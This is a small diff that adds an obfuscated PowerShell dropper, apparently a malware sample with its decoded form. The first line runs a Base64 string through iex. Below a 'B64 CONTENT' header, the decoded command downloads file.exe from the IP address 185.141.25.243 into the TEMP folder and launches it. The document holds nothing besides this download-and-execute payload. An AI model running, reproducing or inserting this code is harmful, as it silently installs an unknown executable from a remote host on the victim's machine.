@@ -1,0 +1,7 @@
+iex([SYStEM.tEXt.eNCODinG]::utF8.GeTSTriNg([SYStEM.CoNVERt]::FROMbaSe64sTRIng('CihOZXctT2JqZWN0IHN5c1RFTS5OZVQud2ViY2xpZW50KS5kT1dOTE9hREZpTEUoJ2h0dHA6Ly8xODUuMTQxLjI1LjI0My9maWxlLmV4ZScsIiRlbnY6VEVNUFxmaWxleDg2LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZW52OlRFTVBcZmlsZXg4Ni5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sysTEM.NeT.webclient).dOWNLOaDFiLE('http://185.141.25.243/file.exe',"$env:TEMP\filex86.exe");Start-Process ("$env:TEMP\filex86.exe")
+
